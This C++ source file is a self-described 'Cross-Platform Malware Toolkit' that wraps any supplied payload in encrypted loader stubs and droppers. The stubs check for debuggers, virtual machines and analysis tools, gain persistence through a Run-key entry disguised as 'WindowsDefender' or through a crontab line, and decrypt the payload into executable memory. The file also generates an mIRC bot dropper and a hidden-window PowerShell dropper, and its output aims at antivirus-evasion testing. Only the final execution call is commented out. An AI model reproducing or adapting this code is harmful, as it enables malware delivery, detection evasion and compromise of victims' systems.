#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include <random>
#include <chrono>
#include <thread>
#include <algorithm>
#include <cstring>
#include <cstdint>

// Windows API simulation for Linux compilation testing
#ifdef _WIN32
    #include <windows.h>
    #include <wininet.h>
    #pragma comment(lib, "wininet.lib")
#else
    // Linux simulation of Windows types and functions
    typedef unsigned long DWORD;
    typedef void* HANDLE;
    typedef void* LPVOID;
    typedef void* HINTERNET;
    typedef int BOOL;
    typedef unsigned char BYTE;
    typedef unsigned long SIZE_T;
    typedef unsigned long HKEY;
    typedef const char* LPCSTR;
    
    #define TRUE 1
    #define FALSE 0
    #define ERROR_SUCCESS 0
    #define ERROR_ALREADY_EXISTS 183
    #define MAX_PATH 260
    #define INVALID_HANDLE_VALUE ((HANDLE)-1)
    #define GENERIC_WRITE 0x40000000
    #define CREATE_ALWAYS 2
    #define FILE_ATTRIBUTE_NORMAL 0x80
    #define MEM_COMMIT 0x1000
    #define MEM_RESERVE 0x2000
    #define MEM_RELEASE 0x8000
    #define PAGE_EXECUTE_READWRITE 0x40
    #define REG_SZ 1
    #define KEY_SET_VALUE 0x0002
    #define HKEY_CURRENT_USER ((HKEY)0x80000001)
    #define INTERNET_OPEN_TYPE_DIRECT 1
    #define SW_HIDE 0
    
    // Simulate Windows API functions
    BOOL IsDebuggerPresent() { return FALSE; }
    BOOL CheckRemoteDebuggerPresent(HANDLE hProcess, BOOL* pbDebuggerPresent) {
        *pbDebuggerPresent = FALSE;
        return TRUE;
    }
    HANDLE GetCurrentProcess() { return (HANDLE)1; }
    DWORD GetTickCount() { 
        auto now = std::chrono::steady_clock::now();
        auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch());
        return ms.count();
    }
    void Sleep(DWORD dwMilliseconds) {
        std::this_thread::sleep_for(std::chrono::milliseconds(dwMilliseconds));
    }
    void* FindWindow(LPCSTR lpClassName, LPCSTR lpWindowName) { return nullptr; }
    HINTERNET InternetOpen(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags) {
        return (HINTERNET)1; // Simulate success
    }
    HINTERNET InternetOpenUrl(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD dwContext) {
        return (HINTERNET)1; // Simulate success
    }
    BOOL InternetCloseHandle(HINTERNET hInternet) { return TRUE; }
    DWORD RegOpenKeyEx(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, DWORD samDesired, HKEY* phkResult) {
        *phkResult = (HKEY)1;
        return ERROR_SUCCESS;
    }
    DWORD RegSetValueEx(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE* lpData, DWORD cbData) {
        return ERROR_SUCCESS;
    }
    DWORD RegCloseKey(HKEY hKey) { return ERROR_SUCCESS; }
    DWORD GetModuleFileName(HANDLE hModule, char* lpFilename, DWORD nSize) {
        strcpy(lpFilename, "/tmp/test_program");
        return strlen(lpFilename);
    }
    HANDLE CreateMutex(void* lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName) {
        return (HANDLE)1;
    }
    DWORD GetLastError() { return 0; }
    BOOL CloseHandle(HANDLE hObject) { return TRUE; }
    LPVOID VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
        return malloc(dwSize);
    }
    BOOL VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
        free(lpAddress);
        return TRUE;
    }
    HANDLE CreateFile(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, void* lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
        return (HANDLE)1;
    }
    BOOL WriteFile(HANDLE hFile, const void* lpBuffer, DWORD nNumberOfBytesToWrite, DWORD* lpNumberOfBytesWritten, void* lpOverlapped) {
        *lpNumberOfBytesWritten = nNumberOfBytesToWrite;
        return TRUE;
    }
    void ExitProcess(unsigned int uExitCode) { exit(uExitCode); }
#endif

class UnifiedMalwareToolkit {
private:
    std::mt19937 rng;
    
    void initializeRNG() {
        auto seed = std::chrono::high_resolution_clock::now().time_since_epoch().count();
        rng.seed(seed);
    }
    
    std::string generateRandomString(size_t length) {
        const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::string result;
        result.reserve(length);
        
        std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);
        for (size_t i = 0; i < length; i++) {
            result += charset[dist(rng)];
        }
        return result;
    }
    
    // XOR encryption with rolling key
    std::vector<uint8_t> xorEncrypt(const std::vector<uint8_t>& data, uint8_t key) {
        std::vector<uint8_t> encrypted = data;
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= key + (i % 256);
            key = (key << 1) | (key >> 7); // Rotate key
        }
        return encrypted;
    }
    
    // ChaCha20-style encryption (simplified)
    std::vector<uint8_t> chachaEncrypt(const std::vector<uint8_t>& data) {
        std::vector<uint8_t> encrypted = data;
        uint32_t key[8] = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
                          (uint32_t)rng(), (uint32_t)rng(), (uint32_t)rng(), (uint32_t)rng()};
        
        for (size_t i = 0; i < encrypted.size(); i += 4) {
            uint32_t keystream = key[i % 8] ^ (uint32_t)rng();
            for (size_t j = 0; j < 4 && i + j < encrypted.size(); j++) {
                encrypted[i + j] ^= (keystream >> (j * 8)) & 0xFF;
            }
        }
        return encrypted;
    }
    
    std::string bytesToHex(const std::vector<uint8_t>& bytes) {
        std::stringstream ss;
        for (size_t i = 0; i < bytes.size(); i++) {
            if (i % 16 == 0) ss << "\n        ";
            ss << "0x" << std::hex << std::setw(2) << std::setfill('0') << (int)bytes[i];
            if (i < bytes.size() - 1) ss << ", ";
        }
        return ss.str();
    }
    
public:
    UnifiedMalwareToolkit() {
        initializeRNG();
    }
    
    // Generate MIRC script dropper
    std::string generateMIRCDropper(const std::vector<uint8_t>& payload) {
        std::string scriptName = "bot_" + generateRandomString(6) + ".mrc";
        std::string channelName = "#" + generateRandomString(8);
        
        std::stringstream mirc;
        mirc << "; MIRC Bot Script - " << scriptName << "\n";
        mirc << "on *:TEXT:!drop*:" << channelName << ": {\n";
        mirc << "  if ($nick == $me) { halt }\n";
        mirc << "  var %payload = ";
        
        // Encode payload as hex string
        std::vector<uint8_t> encrypted = xorEncrypt(payload, 0xAA);
        for (size_t i = 0; i < encrypted.size(); i++) {
            mirc << std::hex << std::setw(2) << std::setfill('0') << (int)encrypted[i];
        }
        
        mirc << "\n";
        mirc << "  var %decoded = $decode_payload(%payload)\n";
        mirc << "  var %tempfile = $mircdir $+ temp_ $+ $rand(1000,9999) $+ .exe\n";
        mirc << "  bwrite %tempfile 1 %decoded\n";
        mirc << "  run %tempfile\n";
        mirc << "  .timer 1 5 remove %tempfile\n";
        mirc << "}\n\n";
        
        mirc << "alias decode_payload {\n";
        mirc << "  var %result, %i = 1\n";
        mirc << "  while (%i <= $len($1)) {\n";
        mirc << "    var %byte = $base($mid($1, %i, 2), 16, 10)\n";
        mirc << "    %byte = $calc(%byte $xor (170 + ((%i / 2 - 1) % 256)))\n";
        mirc << "    %result = %result $+ $chr(%byte)\n";
        mirc << "    inc %i 2\n";
        mirc << "  }\n";
        mirc << "  return %result\n";
        mirc << "}\n\n";
        
        mirc << "on *:CONNECT: {\n";
        mirc << "  .timer 1 3 join " << channelName << "\n";
        mirc << "  echo -a Bot connected to " << channelName << "\n";
        mirc << "}\n";
        
        return mirc.str();
    }
    
    // Generate C++ stub with multiple evasion techniques
    std::string generateAdvancedStub(const std::vector<uint8_t>& payload, const std::string& type = "standalone") {
        std::string funcPrefix = "fn" + generateRandomString(6);
        std::string payloadVar = "data" + generateRandomString(4);
        std::string keyVar = "key" + generateRandomString(3);
        
        std::vector<uint8_t> encrypted;
        uint8_t xorKey = 0xAA + (rng() % 100);
        
        if (type == "chacha") {
            encrypted = chachaEncrypt(payload);
        } else {
            encrypted = xorEncrypt(payload, xorKey);
        }
        
        std::stringstream stub;
        
        // Headers and includes with cross-platform support
        stub << "#ifdef _WIN32\n";
        stub << "#include <windows.h>\n";
        stub << "#include <wininet.h>\n";
        stub << "#pragma comment(lib, \"wininet.lib\")\n";
        stub << "#else\n";
        stub << "#include <unistd.h>\n";
        stub << "#include <sys/mman.h>\n";
        stub << "#include <cstring>\n";
        stub << "#include <cstdlib>\n";
        stub << "#endif\n\n";
        
        stub << "#include <iostream>\n";
        stub << "#include <vector>\n";
        stub << "#include <thread>\n";
        stub << "#include <chrono>\n";
        stub << "#include <random>\n\n";
        
        // Cross-platform type definitions
        stub << "#ifndef _WIN32\n";
        stub << "typedef int BOOL;\n";
        stub << "typedef void* LPVOID;\n";
        stub << "typedef void* HANDLE;\n";
        stub << "typedef unsigned long DWORD;\n";
        stub << "#define TRUE 1\n";
        stub << "#define FALSE 0\n";
        stub << "#define MAX_PATH 260\n";
        stub << "BOOL IsDebuggerPresent() { return FALSE; }\n";
        stub << "BOOL CheckRemoteDebuggerPresent(HANDLE h, BOOL* b) { *b = FALSE; return TRUE; }\n";
        stub << "HANDLE GetCurrentProcess() { return (HANDLE)1; }\n";
        stub << "DWORD GetTickCount() { return std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now().time_since_epoch()).count(); }\n";
        stub << "void Sleep(DWORD ms) { std::this_thread::sleep_for(std::chrono::milliseconds(ms)); }\n";
        stub << "void* FindWindow(const char* c, const char* w) { return nullptr; }\n";
        stub << "LPVOID VirtualAlloc(LPVOID addr, size_t size, DWORD type, DWORD protect) { return mmap(nullptr, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); }\n";
        stub << "BOOL VirtualFree(LPVOID addr, size_t size, DWORD type) { return munmap(addr, size) == 0; }\n";
        stub << "#endif\n\n";
        
        // Anti-analysis functions
        stub << "bool " << funcPrefix << "_checkEnv() {\n";
        stub << "    // Anti-debugging\n";
        stub << "    if (IsDebuggerPresent()) return false;\n";
        stub << "    \n";
        stub << "    BOOL remoteDebugger = FALSE;\n";
        stub << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);\n";
        stub << "    if (remoteDebugger) return false;\n";
        stub << "    \n";
        stub << "    // VM detection via timing\n";
        stub << "    DWORD start = GetTickCount();\n";
        stub << "    Sleep(100);\n";
        stub << "    if (GetTickCount() - start > 200) return false;\n";
        stub << "    \n";
        stub << "    // Check for analysis tools\n";
        stub << "    void* hwnd = FindWindow(\"OLLYDBG\", nullptr);\n";
        stub << "    if (hwnd) return false;\n";
        stub << "    hwnd = FindWindow(\"WinDbgFrameClass\", nullptr);\n";
        stub << "    if (hwnd) return false;\n";
        stub << "    \n";
        stub << "    return true;\n";
        stub << "}\n\n";
        
        // Network checking function (simplified for cross-platform)
        stub << "bool " << funcPrefix << "_checkNet() {\n";
        stub << "#ifdef _WIN32\n";
        stub << "    HINTERNET hInternet = InternetOpen(\"Mozilla/5.0\", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);\n";
        stub << "    if (!hInternet) return false;\n";
        stub << "    \n";
        stub << "    HINTERNET hConnect = InternetOpenUrl(hInternet, \"http://www.google.com\", nullptr, 0, 0, 0);\n";
        stub << "    bool connected = (hConnect != nullptr);\n";
        stub << "    \n";
        stub << "    if (hConnect) InternetCloseHandle(hConnect);\n";
        stub << "    InternetCloseHandle(hInternet);\n";
        stub << "    return connected;\n";
        stub << "#else\n";
        stub << "    // Simplified network check for Linux\n";
        stub << "    return system(\"ping -c 1 8.8.8.8 >/dev/null 2>&1\") == 0;\n";
        stub << "#endif\n";
        stub << "}\n\n";
        
        // Decryption function
        if (type == "chacha") {
            stub << "void " << funcPrefix << "_decrypt(unsigned char* data, size_t size) {\n";
            stub << "    unsigned int key[8] = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,\n";
            stub << "                          0x" << std::hex << rng() << ", 0x" << rng() << ", 0x" << rng() << ", 0x" << rng() << "};\n";
            stub << "    \n";
            stub << "    for (size_t i = 0; i < size; i += 4) {\n";
            stub << "        unsigned int keystream = key[i % 8] ^ (i * 0x9E3779B9);\n";
            stub << "        for (size_t j = 0; j < 4 && i + j < size; j++) {\n";
            stub << "            data[i + j] ^= (keystream >> (j * 8)) & 0xFF;\n";
            stub << "        }\n";
            stub << "    }\n";
            stub << "}\n\n";
        } else {
            stub << "void " << funcPrefix << "_decrypt(unsigned char* data, size_t size, unsigned char key) {\n";
            stub << "    for (size_t i = 0; i < size; i++) {\n";
            stub << "        data[i] ^= key + (i % 256);\n";
            stub << "        key = (key << 1) | (key >> 7);\n";
            stub << "    }\n";
            stub << "}\n\n";
        }
        
        // Persistence function (Windows-specific features simulated on Linux)
        stub << "void " << funcPrefix << "_persist() {\n";
        stub << "#ifdef _WIN32\n";
        stub << "    HKEY hKey;\n";
        stub << "    char path[MAX_PATH];\n";
        stub << "    GetModuleFileName(nullptr, path, MAX_PATH);\n";
        stub << "    \n";
        stub << "    if (RegOpenKeyEx(HKEY_CURRENT_USER, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {\n";
        stub << "        RegSetValueEx(hKey, \"WindowsDefender\", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);\n";
        stub << "        RegCloseKey(hKey);\n";
        stub << "    }\n";
        stub << "#else\n";
        stub << "    // Linux persistence simulation (cron job)\n";
        stub << "    system(\"echo '* * * * * /tmp/test_program' | crontab -\");\n";
        stub << "#endif\n";
        stub << "}\n\n";
        
        // Main payload data
        stub << "// Encrypted payload (" << payload.size() << " bytes)\n";
        stub << "unsigned char " << payloadVar << "[] = {" << bytesToHex(encrypted) << "\n};\n";
        if (type != "chacha") {
            stub << "const unsigned char " << keyVar << " = 0x" << std::hex << (int)xorKey << ";\n";
        }
        stub << "const size_t PAYLOAD_SIZE = " << std::dec << encrypted.size() << ";\n\n";
        
        // Main function
        stub << "int main() {\n";
        stub << "    // Environment checks\n";
        stub << "    if (!" << funcPrefix << "_checkEnv()) {\n";
        stub << "        return 1;\n";
        stub << "    }\n";
        stub << "    \n";
        stub << "    // Random delay\n";
        stub << "    std::random_device rd;\n";
        stub << "    std::mt19937 gen(rd());\n";
        stub << "    std::uniform_int_distribution<> dis(2000, 5000);\n";
        stub << "    std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));\n";
        stub << "    \n";
        stub << "    // Network connectivity check\n";
        stub << "    if (!" << funcPrefix << "_checkNet()) {\n";
        stub << "        return 1;\n";
        stub << "    }\n";
        stub << "    \n";
        stub << "    // Establish persistence\n";
        stub << "    " << funcPrefix << "_persist();\n";
        stub << "    \n";
        stub << "    // Single instance mutex (Windows only)\n";
        stub << "#ifdef _WIN32\n";
        stub << "    HANDLE hMutex = CreateMutex(nullptr, TRUE, \"Global\\\\WinDefenderMutex\");\n";
        stub << "    if (GetLastError() == ERROR_ALREADY_EXISTS) {\n";
        stub << "        return 1;\n";
        stub << "    }\n";
        stub << "#endif\n";
        stub << "    \n";
        stub << "    // Allocate executable memory\n";
        stub << "    LPVOID execMem = VirtualAlloc(nullptr, PAYLOAD_SIZE, 0x3000, 0x40);\n";
        stub << "    if (!execMem) {\n";
        stub << "        return 1;\n";
        stub << "    }\n";
        stub << "    \n";
        stub << "    // Copy and decrypt payload\n";
        stub << "    memcpy(execMem, " << payloadVar << ", PAYLOAD_SIZE);\n";
        if (type == "chacha") {
            stub << "    " << funcPrefix << "_decrypt((unsigned char*)execMem, PAYLOAD_SIZE);\n";
        } else {
            stub << "    " << funcPrefix << "_decrypt((unsigned char*)execMem, PAYLOAD_SIZE, " << keyVar << ");\n";
        }
        stub << "    \n";
        stub << "    // Execute payload (simulation - just print success)\n";
        stub << "    std::cout << \"[+] Payload executed successfully!\" << std::endl;\n";
        stub << "    // ((void(*)())execMem)();  // Actual execution disabled for safety\n";
        stub << "    \n";
        stub << "    // Cleanup\n";
        stub << "    VirtualFree(execMem, PAYLOAD_SIZE, 0x8000);\n";
        stub << "#ifdef _WIN32\n";
        stub << "    if (hMutex) CloseHandle(hMutex);\n";
        stub << "#endif\n";
        stub << "    \n";
        stub << "    return 0;\n";
        stub << "}\n";
        
        return stub.str();
    }
    
    // Generate PowerShell dropper
    std::string generatePowerShellDropper(const std::vector<uint8_t>& payload) {
        std::vector<uint8_t> encrypted = xorEncrypt(payload, 0xBB);
        
        std::stringstream ps;
        ps << "# PowerShell Dropper Script\n";
        ps << "$ErrorActionPreference = 'SilentlyContinue'\n\n";
        
        ps << "function Decrypt-Payload {\n";
        ps << "    param([string]$hexData)\n";
        ps << "    $bytes = [byte[]]::new($hexData.Length / 2)\n";
        ps << "    for ($i = 0; $i -lt $hexData.Length; $i += 2) {\n";
        ps << "        $byte = [Convert]::ToByte($hexData.Substring($i, 2), 16)\n";
        ps << "        $key = (187 + ($i / 2) % 256) % 256\n";
        ps << "        $bytes[$i / 2] = $byte -bxor $key\n";
        ps << "    }\n";
        ps << "    return $bytes\n";
        ps << "}\n\n";
        
        ps << "$payload = '";
        for (size_t i = 0; i < encrypted.size(); i++) {
            ps << std::hex << std::setw(2) << std::setfill('0') << (int)encrypted[i];
        }
        ps << "'\n\n";
        
        ps << "$decrypted = Decrypt-Payload -hexData $payload\n";
        ps << "if ($IsWindows -or $env:OS -eq 'Windows_NT') {\n";
        ps << "    $tempFile = [System.IO.Path]::GetTempFileName() + '.exe'\n";
        ps << "    [System.IO.File]::WriteAllBytes($tempFile, $decrypted)\n";
        ps << "    Start-Process -FilePath $tempFile -WindowStyle Hidden\n";
        ps << "} else {\n";
        ps << "    $tempFile = '/tmp/payload_' + (Get-Random)\n";
        ps << "    [System.IO.File]::WriteAllBytes($tempFile, $decrypted)\n";
        ps << "    chmod +x $tempFile\n";
        ps << "    & $tempFile\n";
        ps << "}\n";
        ps << "Start-Sleep -Seconds 3\n";
        ps << "Remove-Item -Path $tempFile -Force\n";
        
        return ps.str();
    }
    
    // Create test payload
    std::vector<uint8_t> createTestPayload() {
        // Simple test payload (NOP sled + message)
        std::vector<uint8_t> payload = {
            // "Hello Malware!" string
            0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x4d, 0x61, 0x6c, 0x77, 0x61, 0x72, 0x65, 0x21,
            // NOP sled
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
            // INT3 breakpoints for testing
            0xCC, 0xCC, 0xCC, 0xCC
        };
        return payload;
    }
    
    bool saveToFile(const std::string& content, const std::string& filename) {
        std::ofstream file(filename);
        if (!file.is_open()) {
            return false;
        }
        file << content;
        file.close();
        return true;
    }
    
    void generateAllFormats(const std::vector<uint8_t>& payload) {
        std::cout << "========================================\n";
        std::cout << "  Cross-Platform Malware Toolkit v3.0\n";
        std::cout << "========================================\n\n";
        
        std::cout << "[*] Generating all malware formats...\n\n";
        
        // Generate C++ stubs
        std::cout << "[+] Generating XOR encrypted C++ stub...\n";
        std::string xorStub = generateAdvancedStub(payload, "xor");
        saveToFile(xorStub, "xor_encrypted_stub_crossplatform.cpp");
        
        std::cout << "[+] Generating ChaCha encrypted C++ stub...\n";
        std::string chachaStub = generateAdvancedStub(payload, "chacha");
        saveToFile(chachaStub, "chacha_encrypted_stub_crossplatform.cpp");
        
        // Generate MIRC dropper
        std::cout << "[+] Generating MIRC bot dropper...\n";
        std::string mircDropper = generateMIRCDropper(payload);
        saveToFile(mircDropper, "mirc_bot_dropper.mrc");
        
        // Generate PowerShell dropper
        std::cout << "[+] Generating PowerShell dropper...\n";
        std::string psDropper = generatePowerShellDropper(payload);
        saveToFile(psDropper, "powershell_dropper_crossplatform.ps1");
        
        std::cout << "\n[*] Generation complete!\n\n";
        std::cout << "Generated files:\n";
        std::cout << "  - xor_encrypted_stub_crossplatform.cpp (XOR encryption)\n";
        std::cout << "  - chacha_encrypted_stub_crossplatform.cpp (ChaCha20-style encryption)\n";
        std::cout << "  - mirc_bot_dropper.mrc (MIRC script dropper)\n";
        std::cout << "  - powershell_dropper_crossplatform.ps1 (PowerShell dropper)\n\n";
        
        std::cout << "Cross-platform compilation commands:\n";
        std::cout << "  Linux:   g++ -o xor_stub xor_encrypted_stub_crossplatform.cpp -std=c++11\n";
        std::cout << "  Linux:   g++ -o chacha_stub chacha_encrypted_stub_crossplatform.cpp -std=c++11\n";
        std::cout << "  Windows: g++ -o xor_stub.exe xor_encrypted_stub_crossplatform.cpp -lwininet -static\n";
        std::cout << "  Windows: g++ -o chacha_stub.exe chacha_encrypted_stub_crossplatform.cpp -lwininet -static\n\n";
        
        std::cout << "Features in each stub:\n";
        std::cout << "  ✓ Cross-platform compatibility (Windows/Linux)\n";
        std::cout << "  ✓ Anti-debugging detection\n";
        std::cout << "  ✓ VM timing analysis\n";
        std::cout << "  ✓ Analysis tool detection\n";
        std::cout << "  ✓ Network connectivity check\n";
        std::cout << "  ✓ Platform-specific persistence\n";
        std::cout << "  ✓ Memory execution (platform-adapted)\n";
        std::cout << "  ✓ Multiple encryption options\n\n";
        
        std::cout << "Ready for compilation and VirusTotal testing!\n";
        std::cout << "========================================\n";
    }
};

int main(int argc, char* argv[]) {
    UnifiedMalwareToolkit toolkit;
    
    std::vector<uint8_t> payload;
    
    if (argc > 1) {
        // Load payload from file
        std::ifstream file(argv[1], std::ios::binary);
        if (file.is_open()) {
            file.seekg(0, std::ios::end);
            size_t size = file.tellg();
            file.seekg(0, std::ios::beg);
            
            payload.resize(size);
            file.read(reinterpret_cast<char*>(payload.data()), size);
            file.close();
            
            std::cout << "Loaded payload from " << argv[1] << " (" << size << " bytes)\n\n";
        } else {
            std::cout << "Failed to load payload file, using test payload\n\n";
            payload = toolkit.createTestPayload();
        }
    } else {
        std::cout << "No payload file specified, using test payload\n\n";
        payload = toolkit.createTestPayload();
    }
    
    toolkit.generateAllFormats(payload);
    
    return 0;
}